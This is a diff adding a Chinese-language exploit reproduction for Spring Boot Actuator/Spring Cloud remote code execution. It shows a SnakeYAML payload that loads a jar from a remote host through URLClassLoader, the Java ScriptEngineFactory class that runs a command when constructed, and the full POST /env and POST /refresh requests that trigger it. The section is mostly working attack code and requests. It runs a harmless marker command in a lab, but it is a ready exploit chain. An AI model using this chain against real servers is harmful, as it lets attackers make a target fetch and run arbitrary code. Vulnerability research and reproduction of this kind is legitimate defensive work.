@@ -289,7 +289,98 @@ root@kali:/var/www/html# ls /tmp/j*
 /tmp/jas502n
 root@kali:/var/www/html#
 ```
+# yml RCE 漏洞复现 (三)
 
+通过Spring环境`spring.cloud.bootstrap.location` 属性修改来实现RCE的更可靠方法
+
+该属性用于加载外部配置并以YAML格式解析它。
+为了实现这一点，我们还需要调用 `/refresh` 端点。
+
+yaml-payload.yml 文件内容
+
+```
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.20.24.191:8000/yaml_payload.jar"]
+  ]]
+]
+```
+
+## 0x00 yaml_payload.jar 制造
+
+![](./jar.png)
+
+AwesomeScriptEngineFactory.java 部分代码
+```
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.io.IOException;
+import java.util.List;
+
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+            Runtime.getRuntime().exec("touch /tmp/success");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+```
+
+该文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager的构造函数的执行。
+
+http://10.20.24.191:8090/ymal_payload.jar
+
+`spring.cloud.bootstrap.location=http://10.20.24.191:8090/yaml_payload.yml`
+
+## 0x01 Set spring.cloud.bootstrap.location
+
+![](./location.png)
+```
+POST /env HTTP/1.1
+Host: 10.20.24.191:8090
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: 127.0.0.1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+
+spring.cloud.bootstrap.location=http://10.20.24.191:8000/yaml_payload.yml
+```
+
+## 0x02 refresh post任意内容，RCE 漏洞触发
+
+![](./yaml_refresh.png)
+
+```
+POST /refresh HTTP/1.1
+Host: 10.20.24.191:8090
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: 127.0.0.1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+12312
+```
+## 0x03 jar 文件执行成功
+
+![](./yaml_success.png)
+```
+root@kali:/var/www/html# ls /tmp/succ*
+/tmp/success
+root@kali:/var/www/html# 
+
+```
 
 ## 参考链接
 
